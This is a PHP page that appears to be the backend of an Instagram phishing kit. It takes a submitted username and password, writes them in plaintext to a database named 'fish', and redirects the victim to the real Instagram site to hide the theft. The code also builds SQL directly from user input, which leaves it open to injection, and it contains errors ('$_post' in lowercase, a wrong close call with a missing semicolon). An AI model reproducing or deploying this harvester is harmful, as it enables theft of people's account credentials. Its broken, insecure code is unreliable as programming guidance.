<html>
    <head>
        <title>data</title>
    </head>
            <body>
                <?php 
                $username=$_post['username'];
                $password=$_POST['password'];
                $link =mysqli_connect("localhost" ,"root" ,"", "fish");
                if($link ==false){
                    die("error :could not connect." . mysqli_connect_error());
                }
                $sql= "INSERT INTO data( username ,password)VALUES('$username','$password')";
                if(mysqli_query($link,$sql)){
                    header("location:https://www.instagram.com/?hl=en");
                    exit();
                }
                else{
                    echo "error: could not be able to execute $sql.".mysqli_error($link);
                }
                mysql_close($link)
                ?>
            </body>
</html>